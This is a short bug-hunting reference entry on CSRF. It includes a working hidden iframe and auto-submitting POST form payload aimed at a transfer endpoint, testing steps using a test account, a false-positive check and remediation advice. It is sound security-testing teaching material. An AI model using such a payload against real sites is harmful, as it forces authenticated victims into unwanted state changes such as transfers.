# CSRF with an Auto-Submitted POST Form

- What it is: A cross-origin HTML form silently submits attacker-chosen values while the browser attaches the victim's target cookies.
- Where to look: State-changing POST endpoints accepting browser-form content types without effective CSRF validation.
- Build a hidden form containing the required parameters:
```html
<iframe style="display:none" name="csrf-frame"></iframe>
<form method="POST" action="https://target.example/transfer" target="csrf-frame" id="csrf-form">
<input type="hidden" name="to" value="test-recipient">
<input type="hidden" name="amount" value="1">
</form>
<script>document.getElementById("csrf-form").submit()</script>
```
- Load it while authenticated with a test account and confirm the state change.
- The hidden iframe suppresses the returned page; it is not itself the vulnerability.
- False-positive trap: A request rejected without a valid per-user CSRF token is protected.
- Remediation: Validate unpredictable per-session/request CSRF tokens and appropriate origin controls.
## Source: Real-World Bug Hunting — A Field Guide to Web Hacking, Ch. 4
